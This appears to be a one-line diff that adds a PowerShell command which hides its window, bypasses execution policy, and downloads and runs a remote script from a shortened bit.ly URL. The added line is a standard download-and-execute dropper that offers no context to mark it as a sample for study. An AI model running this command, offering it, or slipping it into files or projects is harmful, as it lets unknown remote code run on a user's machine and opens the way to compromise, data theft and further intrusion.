@@ -1,0 +1,1 @@
+powershell -nop -w hidden -ep bypass -c "iex(New-Object Net.WebClient).DownloadString('https://bit.ly/3msO8ba')"
